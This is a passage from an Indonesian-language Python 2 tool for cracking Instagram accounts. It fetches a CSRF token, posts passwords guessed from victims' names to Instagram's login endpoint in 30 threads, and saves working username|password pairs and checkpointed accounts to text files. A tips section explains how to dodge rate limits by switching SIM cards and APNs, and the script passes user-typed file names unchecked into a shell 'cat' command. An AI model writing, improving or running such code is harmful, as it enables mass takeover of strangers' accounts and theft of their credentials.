         jeeck("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m 12. Kita Dapat Mengganti User-Agent Sesuai Kita  👀 Udah Tau Bang")
         jeeck("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m 13. Agent adalah proses mengakui dan menganalisis string agen pengguna untuk mengenali properti string.")
         jeeck("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m 14. 👀 Bang Kalo Ganti User Agent Itu Dapat One Tap Kahh")
         jeeck("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m 15. Belum Tentu Onetap ")
         jeeck("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m 16. Bang Cara Onetap Bagaimana SAYA MAU PAMER")
         jeeck("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m 17. 1.Dump Id Yang Temanya Sedaerah Dengan Lu")
         jeeck("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m 18. 2.Baca Bismillah Terlebih Dahulu")
         jeeck("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m 19. 3.Pada Saat Mau Buka Sesi Usahakan Anda Mempunyai 2 SIM")
         jeeck("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m 20. 4.Semisal Lu Pada Saat Crack Pake Sim1 Terus Lubuka Sesi Pake Sim 2")
         jeeck("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m 21. 5.Bang Masih Kagak Bisa ....??? .·´¯`(>▂<)´¯`·.")
         jeeck("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m 22. 6.Pake Methode Ganti Apn ")
         jeeck("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m 23. 7.Bang Apn Dapet Nya Darimana...???･ﾟﾟ･(>д<)･ﾟﾟ･")
         jeeck("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m 24. 8.Cari Di Google Banyak")
         jeeck("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m 25. 9.Bang Kegunaan Apn Untuk Apa")
         jeeck("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m 25. 10.fungsi APN adalah untuk menyambungkan device dengan operator penyedia layanan internet.")
         jeeck("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m 26. 11.Bang Lu Recode Ya NGGAK KO Hehehe ")
         jeeck("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m 27. 12.Bang Kok Methode Mbasic Kek Punya YayanXD ")
         jeeck("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m 28. 13.Oh Itu Emang Gwe Izin Ke YayanXD Ambil.Cuplikan Methode MBASIC")
         jeeck("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m 29. 14.Sama Aja Lu Recode Bwank ....? ENGGAK KOK HAL INI SAYA SEBUT KERJA SAMA")
         jeeck("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m 30. 15.Methode B-Api Yang Buat Sya , Mbasic Yang Buat YayanXD, Mobile FB Yang Buat RISKY/SUHU DUMAII")
         jeeck("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m 31. 16.Oooh Begitu Ya Bang.... Iyaa")
         jeeck("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m 32. 17.Iyaa Bwank BTW MAKASIH UDAH PAKE TOOLS.SAYA")
         raw_input('\n%s[%s+%s] \033[0;33m[%s Enter \033[0;33m] '%(B,J,B,U,))
         menu()

def chek_crackyou():
	l = raw_input("\n\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Input : ")
	if l in['']:
		jalan("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m WRONK INPUT");jeda(2);menu()
	elif l in['1','01']:
		dirs = os.listdir('OK')
		print("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Results Crack Ok Tersimpan Di Bawah!!")
		for file in dirs:
			
			print("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m ==> %s%s%s "%(B,file,N))
		try:
			file = raw_input("\n\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Nama file : ");jeda(0.2)
			if file in['']:
				exit("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Wronk Input Asuu Celeng")
			totalok = open('OK/%s' % file).read().splitlines()
		except (KeyError, IOError):
			jalan("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m File No Detected Njenk ")
		nm_file = ('%s' % file).replace('-', ' ')
		file_nm = nm_file.replace('.txt', '')
		jeeck("\033[0;36m[\033[0;33m+\033[0;36m]\033[0;00m –––––––––––––––––––[Panjul-Tzy]––––––––––––––––––––––––");jeda(2)
		jalan("%s+%s Results %s : %s%s %stotal %s: %s%s"%(B,J,B,K,file_nm,O,M,H,len(totalok)))
		#print("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Total hasil --> %s "%(len(totalok)))
		jeeck("\033[0;36m[\033[0;33m+\033[0;36m]\033[0;00m –––––––––––––––––––[Panjul-Tzy]––––––––––––––––––––––––");jeda(2)
		os.system('cat OK/%s' % file)
		jeeck("\033[0;36m[\033[0;33m+\033[0;36m]\033[0;00m –––––––––––––––––––[Panjul-Tzy]––––––––––––––––––––––––");jeda(2)
		exit('\n')
	elif l in['2','02']:
		dirs = os.listdir('CP')
		print("\n\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Results Crack CP Tersimpan Di Bawah!! ")
		for file in dirs:
			print("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m ==> %s%s%s "%(K,file,N))
		try:
			file = raw_input("\n\033[0;36m[\033[0;00m+\033[0;36m]\033[0;00m Nama file : ");jeda(0.2)
			if file in['']:
				exit("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Wronk Input Asu Ngentod Babi")
			totalcp = open('CP/%s' % file).read().splitlines()
		except (KeyError, IOError):
			jeeck("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m File Not Detected")
		nm_file = ('%s' % file).replace('-', ' ')
		file_nm = nm_file.replace('.txt', '')
		jeeck("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m –––––––––––––––––––[Panjul-Tzy]––––––––––––––––––––––––");jeda(2)
		jalan("%s+%s Results%s : %s%s %stotal %s: %s%s"%(B,J,B,K,file_nm,O,M,H,len(totalcp)))
		#print("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Total hasil --> %s "%(len(totalcp)))
		jeeck("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m –––––––––––––––––––[Panjul-Tzy]––––––––––––––––––––––––");jeda(2)
		os.system('cat CP/%s' % file)
		jeeck("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m –––––––––––––––––––[Panjul-Tzy]––––––––––––––––––––––––");jeda(2)
		exit('\n')
	else:
		jeeck("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Wronk Input Ya Bangsat");jeda(2);menu()
#....lan2
def hasil_igeh():
	jeeck("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m (1. Chek Results Ok")
	jeeck("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m (2. Chek Results Cp")
	while True:
		mrjreckxnanoxxz = raw_input("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Input : ")
		if mrjreckxnanoxxz in['1','01']:
			try:
				oke = open("hasilok.txt", "r").readlines()
				
				jeeck("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m –––––––––––––––––––[Panjul-Tzy]––––––––––––––––––––––––");jeda(2)
				print ("%s[+] %sTotal  %s: %s%s"%(U,O,M,H,str(len(oke))))
				jeeck("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m –––––––––––––––––––[Panjul-Tzy]––––––––––––––––––––––––");jeda(2)
				okek = open("hasilok.txt", "r").read()
				print (okek)
				jeeck("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m –––––––––––––––––––[Panjul-Tzy]––––––––––––––––––––––––");jeda(2)
			except IOError,KeyError:
				exit (M+"\n [+] Not Detected Results ")
		if mrjreckxnanoxxz in['2','02']:
			try:
				cepe = open("hasilcp.txt", "r").readlines()
#				
				jeeck("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m –––––––––––––––––––[Panjul-Tzy]––––––––––––––––––––––––");jeda(2)
				print ("%s[+] %sJumlah %s: %s%s"%(U,O,M,K,str(len(cepe))))
				jeeck("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m –––––––––––––––––––[Panjul-Tzy]––––––––––––––––––––––––");jeda(2)
				cepek = open("hasilcp.txt", "r").read()
				print (cepek)
				jeeck("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m –––––––––––––––––––[Panjul-Tzy]––––––––––––––––––––––––");jeda(2)
			except IOError,KeyError:
				exit (M+"\n[+] Not Detected Results")


def proses():
	print("\n\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Results OK di simpan di --> %s "%("hasilok.txt"))
	print("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Results CP di simpan di --> %s "%("hasilcp.txt"))
	print("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Jika ingin Berhenti crack TEKAN CTRL + Z \n\n")
def crack2(user, pwx):
	global looping, loping
	c_naruto_ = len(pwx)
	for pas in pwx:
		if looping != 1:
			pass
		else:
			if len(status_foll) != 1:
				print "\r \033[0;00m Cracking %s/%s [OK:%s]-[CP:%s] "%(str(loping),len(mi),len(ok),len(cp)),
				sys.stdout.flush()
				c_naruto_ -= 1
			else:
				pass
		try:
			if user in ok or user in cp:
				break
			pw = pas.lower()
			try:
				headerz = {"User-Agent": user_agentz_api}
				with requests.Session() as ses:
					urll = "https://www.instagram.com/"
					data = ses.get(urll, headers=headerz).content
					tokett = re.findall('{"config":{"csrf_token":"(.*)","viewer"', str(data))[0]
				header = {"Accept": "*/*","Accept-Encoding": "gzip, deflate, br","Accept-Language": "en-US,en;q=0.5","Host": "www.instagram.com","X-CSRFToken": tokett,"X-Requested-With": "XMLHttpRequest","Referer": "https://www.instagram.com/accounts/login/","User-Agent": user_agentz,
						 }
				param = {"username": user,"enc_password": "#PWD_INSTAGRAM_BROWSER:0:{}:{}".format(random.randint(1000000000, 99999999999), pw),"optIntoOneTap": False,"queryParams": {},"stopDeletionNonce": "","trustedDeviceRecords": {}
						}
			except:
				header = {}
				param = {}
				pass
			with requests.Session() as ses:
				url = "https://www.instagram.com/accounts/login/ajax/"
				respon = ses.post(url, data=param, headers=header)
				data = json.loads(respon.content);jeda(00.1)
				# print ("\r",data)
				# print ("\r -->%s,%s,|,%s,%s            "%(P,user,H,pw))
				if "checkpoint_url" in str(data):
					cepeh = "Checkpoint"
					ingfo(user, pw, cepeh)
					with open("hasilcp.txt", "a") as simpan:
						simpan.write(" [Checkpoint] "+user+"|"+pw+"\n")
					cp.append(user)
					break
				elif "userId" in str(data):
					okeh = "Berhasil"
					if len(status_foll) != 1:
						ingfo(user, pw, okeh)
						with open("hasilok.txt", "a")as simpan:
							simpan.write(" [Berhasil] "+user+"|"+pw+"\n")
						ok.append(user)
						#follow(ses,user)
					break
				elif "Please wait" in str(data):
					print("\r\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Mode pesawat 2 detik"),
					looping+=1
					sys.stdout.flush()
					pwx = [pw]
					crack2(user, pwx)
					loping -= 1
				else:
					looping = 1
					pass
		except requests.exceptions.ConnectionError:
			print("\r\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Tidak ada koneksi"),
			sys.stdout.flush()
			looping+=1
			pwx = [pw]
			crack2(user, pwx)
			loping -= 1
		except:
			looping = 1
			pass
	loping+=1
None
# passxnxx IGEH
def passxnxx():
	with ThreadPoolExecutor(max_workers=30) as log:
		for ro in mi:
			try:
				_naruto_ = []
				_r_ = ro.encode("utf-8")
				_o_ = _r_.split("|")[0]
				_m_ = _r_.split("|")[1]
				_i_ = _m_.split()
				if len(cr) != 1:
					if len(_o_) >= 6:
						_naruto_.append(_o_)
						if len(_i_[0]) <= 2:
							if len(_i_) >= 2:
								_naruto_.append(_i_[0]+_i_[1])
							if len(_m_) >= 6:
								_naruto_.append(_m_)
						else:
							_naruto_.append(_i_[0]+"123")
							if len(_i_) >= 2:
								_naruto_.append(_i_[0]+_i_[1])
							if len(_m_) >= 6:
								_naruto_.append(_m_)
					else:
						_naruto_.append(_o_+_o_)
						if len(_i_[0]) <= 2:
							if len(_i_) >= 2:
								_naruto_.append(_i_[0]+_i_[1])
							if len(_m_) >= 6:
								_naruto_.append(_m_)
						else:
							if len(_i_) >= 2:
								_naruto_.append(_i_[0]+_i_[1])
							_naruto_.append(_i_[0]+"123")
							if len(_m_) >= 6:
								_naruto_.append(_m_)
				else:
					_naruto_.append(_i_[0]+"123")
					_naruto_.append(_i_[0]+"12345")
					_naruto_.append(_o_)
				log.submit(crack2, _o_, _naruto_)
			except: pass
	jeeck("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Crack selesai.....");exit()
def ingfo(user, pw, status):
	try:
		global idg, pengikut, mengikuti
		dta = requests.get("https://www.instagram.com/%s/?__a=1"%(user), headers={"User-Agent": user_agentz})
		dta_ = dta.json()["graphql"]["user"]
		nama = dta_["full_name"].encode("utf-8")
		idg = dta_["id"]
		pengikut = dta_["edge_followed_by"]["count"]
		mengikuti = dta_["edge_follow"]["count"]
		if status == "Berhasil":
#	#	##	print ("\r%s [√] Berhasil                   "%(H))
		#	print ("\r%s [√] Nama akun %s> %s%s          "%(H,M,H,str(nama)))
		#	print ("\r%s [√] Pengikut  %s> %s%s          "%(H,M,H,str(pengikut)))
		##	print ("\r%s [√] Mengikuti %s> %s%s          "%(H,M,H,str(mengikuti)))
		#	print ("\r%s [√] Username  %s
			print("\r\033[0;36m[\033[0;32m>\033[0;36m]\033[0;36m Live ")
			print("\r\033[0;36m[\033[0;32m>\033[0;36m]\033[0;00m Nama       : %s "%(str(nama)))
			print("\r\033[0;36m[\033[0;32m>\033[0;36m]\033[0;00m Pengikut   : %s "%(str(pengikut)))
			print("\r\033[0;36m[\033[0;32m>\033[0;36m]\033[0;00m Mengikuti  : %s "%(str(mengikuti)))
			print("\r\033[0;36m[\033[0;32m>\033[0;36m]\033[0;00m Username   : %s "%(user))
			print("\r\033[0;36m[\033[0;32m>\033[0;36m]\033[0;00m Password   : %s \n"%(pw))
		elif status == "Checkpoint":
			print("\r\033[0;36m[\033[0;33m>\033[0;36m]\033[0;33m Chekpoint ")
			print("\r\033[0;36m[\033[0;33m>\033[0;36m]\033[0;00m Nama        : %s "%(str(nama)))
			print("\r\033[0;36m[\033[0;33m>\033[0;36m]\033[0;00m Pengikut    : %s "%(str(pengikut)))
			print("\r\033[0;36m[\033[0;33m>\033[0;36m]\033[0;00m Mengikuti   : %s "%(str(mengikuti)))
			print("\r\033[0;36m[\033[0;33m>\033[0;36m]\033[0;00m Username    : %s "%(user)) 
			print("\r\033[0;36m[\033[0;33m>\033[0;36m]\033[0;00m Password    : %s \n"%(pw))
		else:
			pass
	except: pass
None
loping= 1
if __name__ == '__main__':
	os.system("git pull")
	folder()
	menu()
	
# SETOP RECODE KAWAN !!!!
